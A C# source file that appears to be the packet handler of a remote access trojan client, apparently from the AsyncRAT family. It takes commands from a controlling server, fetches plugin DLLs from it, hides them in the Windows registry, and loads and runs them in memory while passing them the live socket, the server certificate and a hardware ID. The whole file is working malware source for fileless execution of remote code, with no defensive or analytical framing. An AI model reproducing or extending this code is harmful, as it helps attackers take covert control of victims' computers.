using Client.Algorithm;
using Client.Helper;
using Client.Connection;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using System.Collections.Generic;
using System.Linq;
using MessagePackLib.MessagePack;

namespace Client.Handle_Packet
{
    public static class Packet
    {
        public static List<MsgPack> Packs = new List<MsgPack>();
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "pong": //send interval value to server
                        {
                            ClientSocket.ActivatePong = false;
                            MsgPack msgPack = new MsgPack();
                            msgPack.ForcePathObject("Packet").SetAsString("pong");
                            msgPack.ForcePathObject("Message").SetAsInteger(ClientSocket.Interval);
                            ClientSocket.Send(msgPack.Encode2Bytes());
                            ClientSocket.Interval = 0;
                            break;
                        }

                    case "plugin": // run plugin in memory
                        {
                            try
                            {
                                if (SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null) // check if plugin is installed
                                {
                                    Packs.Add(unpack_msgpack); //save it for later
                                    MsgPack msgPack = new MsgPack();
                                    msgPack.ForcePathObject("Packet").SetAsString("sendPlugin");
                                    msgPack.ForcePathObject("Hashes").SetAsString(unpack_msgpack.ForcePathObject("Dll").AsString);
                                    ClientSocket.Send(msgPack.Encode2Bytes());
                                }
                                else
                                    Invoke(unpack_msgpack);
                            }
                            catch (Exception ex)
                            {
                                Error(ex.Message);
                            }
                            break;
                        }

                    case "savePlugin": // save plugin
                        {
                            SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
                            Debug.WriteLine("plugin saved");
                            foreach (MsgPack msgPack in Packs.ToList())
                            {
                                if (msgPack.ForcePathObject("Dll").AsString == unpack_msgpack.ForcePathObject("Hash").AsString)
                                {
                                    Invoke(msgPack);
                                    Packs.Remove(msgPack);
                                }
                            }
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void Invoke(MsgPack unpack_msgpack)
        {
            Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)));
            Type type = assembly.GetType("Plugin.Plugin");
            dynamic instance = Activator.CreateInstance(type);
            instance.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BDOS, Settings.Install);
            Received();
        }

        private static void Received() //reset client forecolor
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Received";
            ClientSocket.Send(msgpack.Encode2Bytes());
            Thread.Sleep(1000);
        }

        public static void Error(string ex) //send to logs
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            ClientSocket.Send(msgpack.Encode2Bytes());
        }
    }
}
